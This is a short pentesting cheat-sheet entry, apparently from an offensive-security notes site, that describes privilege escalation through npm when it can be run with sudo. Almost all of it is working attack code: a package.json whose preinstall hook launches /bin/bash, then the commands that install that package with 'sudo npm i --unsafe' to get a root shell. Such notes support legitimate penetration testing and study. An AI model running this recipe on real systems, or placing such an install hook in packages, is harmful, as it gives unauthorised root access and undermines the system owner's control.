---
title: "Npm"
tags: ["Npm", "Nodejs", "Sudo", "Exploitation"]
---

### Privesc #1: Create a Malicious Package

Create a 'package.json'

```console
{
  "name": "root",
  "version": "1.0.0",
  "scripts": {
    "preinstall": "/bin/bash"
  }
}
```

<br>

```console
mkdir test
```

```console
mv package.json test/
```

```console
sudo npm i test/ --unsafe
```
